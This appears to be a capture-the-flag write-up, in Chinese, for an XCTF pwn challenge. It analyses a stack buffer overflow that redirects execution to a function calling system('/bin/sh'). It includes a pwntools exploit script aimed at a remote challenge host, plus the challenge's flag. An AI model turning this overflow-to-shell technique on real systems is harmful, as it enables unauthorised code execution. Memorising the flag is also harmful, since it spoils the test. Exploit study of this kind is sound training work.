https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5053

# 分析

1. IDA分析

   ```
   int __cdecl main(int argc, const char **argv, const char **envp)
   {
     write(1, "Hello, World\n", 0xDuLL);
     return vulnerable_function();
   }
   ```

   ```
   ssize_t vulnerable_function()
   {
     char buf; // [rsp+0h] [rbp-80h]
   
     return read(0, &buf, 0x200uLL);
   }
   ```

   ```
   int callsystem()
   {
     return system("/bin/sh");
   }
   ```

   栈溢出，buf的长度是0x80,buf后面的数据如下：

   ![image-20210806230036469](images\image-20210806230036469.png)

   首先，有一个s，8个字节长度，其次是一个r，重点就在这，r中存放着的就是返回地址。即当read函数结束后，程序下一步要到的地方。就是callsystem函数，即可执行shell。

   ![image-20210806230333570](images\image-20210806230333570.png)

callsystem开始地址是0x400596

2. 编写python脚本

   ```
   from pwn import *
   
   context.arch = "amd64"
   
   payload = b'a'*0x88 + p64(0x400596)
   print(payload)
   
   io = remote('111.200.241.244',64529 )
   io.sendline(payload)
   io.interactive()
   ```

   在Kali中运行，得到flag：cyberpeace{edb01582c6791821bd215d68e1724c18}

   ![image-20210806230450884](images\image-20210806230450884.png)